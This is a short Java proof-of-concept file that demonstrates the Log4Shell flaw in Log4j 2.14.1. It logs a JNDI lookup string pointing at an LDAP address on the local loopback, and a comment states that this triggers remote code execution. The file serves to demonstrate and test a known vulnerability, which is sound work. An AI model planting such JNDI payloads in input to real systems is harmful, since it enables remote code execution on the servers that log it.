// Log4J 2.14.1 & confluent cp4

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

// rest
//import org.apache.log4j.Logger;

import java.io.IOException;

public class VulnerableLog4jExample {

  // Log4J 2.14.1 & confluent cp4
  static Logger log = LogManager.getLogger();

  // Log4J rest
//  static Logger log = Logger.getLogger(VulnerableLog4jExample.class);

  public static void main(String[] args) throws IOException {
    String attackString = "${jndi:ldap://127.0.0.6/a}";
    // This line triggers the RCE by logging the attackString.
    log.info("Requesting :" + attackString);
  }
}